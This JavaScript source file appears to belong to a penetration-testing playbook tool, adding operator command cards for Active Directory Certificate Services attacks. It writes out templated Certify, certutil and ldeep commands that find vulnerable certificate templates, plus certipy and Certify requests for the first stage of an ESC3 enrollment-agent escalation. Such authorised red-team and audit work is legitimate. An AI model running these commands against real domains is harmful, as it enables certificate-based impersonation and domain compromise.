// Obol v6.5 source-delivery overlay — finish operator-side contracts for the first five AD CS atomic units.
(function(root){
'use strict';
const lanes=root.OBOL_LANES||[],O=root.OBOL_ORANGE_AD_2025_03,M=root.OBOL_METHODOLOGY_V65;
if(!O||!M)throw new Error('Obol Orange snapshot and v6.5 methodology are required before source-delivery-v6.5.js');
function card(id){for(const l of lanes)for(const c of l.cards||[])if(c.id===id)return c;return null;}
function addCommand(c,cmd){if(!c)return;if(!(c.commands||[]).some(x=>String(x.run||'')===String(cmd.run||''))){c.commands=c.commands||[];c.commands.push(cmd);}}
function addTool(c,t){if(!c)return;c.tools=c.tools||[];if(!c.tools.includes(t))c.tools.push(t);}
const enumeration=card('adcs-enumeration55');
if(!enumeration)throw new Error('Missing v6.5 AD CS enumeration owner');
addCommand(enumeration,{tool:'certify',run:'Certify.exe find /vulnerable',note:'Windows-side AD CS inventory from the pinned source. Use it when Certify is already present; explicit findings route branches but never prove exploitation.',operatorSurface40:'windows',operatorSurface65Source:'audited-v6.5'});
addCommand(enumeration,{tool:'certutil',run:'certutil -v -dsTemplate',note:'Native Windows template inventory fallback. Treat template data as discovery only and route only from explicit properties.',operatorSurface40:'windows',operatorSurface65Source:'audited-v6.5'});
addCommand(enumeration,{tool:'ldeep',run:"ldeep ldap -u '{{user}}' -p '{{password}}' -d '{{domain}}' -s {{target}} templates",note:'Kali-side LDAP template inventory fallback matching the pinned source. Use when a directory-centric view is useful.',operatorSurface40:'kali',operatorSurface65Source:'audited-v6.5'});
for(const t of ['Certify','certutil','ldeep'])addTool(enumeration,t);
const esc2=card('adcs-esc2-65'),esc3=card('adcs-esc3-65');
if(!esc2||!esc3)throw new Error('Missing v6.5 ESC2/ESC3 owners');
if(!esc2.produces.includes('adcs.agent_certificate'))esc2.produces.push('adcs.agent_certificate');
esc3.prereq={any:['adcs.esc3','adcs.esc2','adcs.agent_certificate']};
if(!esc3.produces.includes('adcs.target_certificate'))esc3.produces.push('adcs.target_certificate');
const agentCertipy={tool:'certipy',run:"certipy req -u {{user}}@{{domain}} -p '{{password}}' -target {{ca_target}} -template '{{agent_template}}' -ca '{{ca_name}}'",note:'ESC3 stage 1: obtain the reviewed enrollment-agent certificate. This PFX is an intermediate credential artifact and does not establish target-user access.',opts:[{arg:'-dc-ip',semantic:'Domain controller IP',placeholder:'10.0.0.10',tip:'Pin the DC when name resolution is unreliable.',category:'Network'},{flag:'-debug',semantic:'Debug output',tip:'Expose enrollment errors for Evidence review.',category:'Output',advanced:true}],operatorSurface40:'kali',operatorSurface65Source:'audited-v6.5'};
const agentCertify={tool:'certify',run:'Certify.exe request /ca:{{ca_server}}\\{{ca_name}} /template:"{{agent_template}}"',note:'Windows-side ESC3 stage 1 fallback. Preserve the issued enrollment-agent certificate separately from the later on-behalf-of target certificate.',operatorSurface40:'windows',operatorSurface65Source:'audited-v6.5'};
esc3.commands=esc3.commands||[];for(const cmd of [agentCertify,agentCertipy].reverse())if(!esc3.commands.some(x=>String(x.run||'')===cmd.run))esc3.commands.unshift(cmd);
function section(key){for(const f of O.files||[])for(const s of f.sections||[])if(s.key===key)return s;return null;}
for(const [key,reason] of [['adcs.enumeration','All atomized enumeration/routing depth is modeled end to end in v6.5.'],['adcs.web-enrollment','The atomized ESC8 web-enrollment path is modeled end to end in v6.5.']]){const s=section(key);if(s)s.sourceDepthAudit62={status:'modeled',reason};}
root.OBOL_SOURCE_DELIVERY_V65={version:'6.5.0',completedBaselineKeys:['adcs.enumeration','adcs.web-enrollment'],statement:'v6.5 adds the missing Windows/Kali enumeration choices, explicit ESC3 agent-certificate stage, and frozen-baseline completion markers required by the North Star.'};
})(typeof window!=='undefined'?window:globalThis);
